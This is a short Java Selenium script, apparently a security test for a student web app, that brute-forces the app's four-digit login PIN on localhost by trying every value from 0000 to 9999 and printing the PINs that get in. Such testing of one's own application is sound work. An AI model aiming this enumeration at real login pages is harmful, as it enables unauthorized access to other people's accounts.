package it.unisa.saporidiunisa.selenium;

import lombok.val;
import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

import java.time.Duration;
import java.util.HashMap;

/**
 * @author Salvatore Ruocco
 * Attacco di tipo bruteforce sul login
 * Stampa in output i pin che hanno permesso l'accesso e la pagina a cui si viene reindirizzati
 */

public class LoginBruteforce {
    public static void main(String[] args) {
        final WebDriver driver = new ChromeDriver();
        final String baseUrl = "http://localhost:8080/SaporiDiUnisa_war_exploded/";
        driver.get(baseUrl);

        driver.manage().timeouts().implicitlyWait(Duration.ofMillis(1));

        val pinUrl = new HashMap<String, String>();
        for (int i = 0; i <= 9999; i++) {
            val pin = String.format("%04d", i);
            final WebElement inputPin = driver.findElement(By.id("pin"));
            inputPin.sendKeys(pin);
            inputPin.sendKeys(Keys.ENTER);
            if(!driver.getCurrentUrl().equals(baseUrl + "login-servlet")) {
                pinUrl.put(pin, driver.getCurrentUrl());    // Accesso effettuato
            }
            driver.get(baseUrl);
        }

        driver.quit();

        System.out.println(pinUrl);
    }
}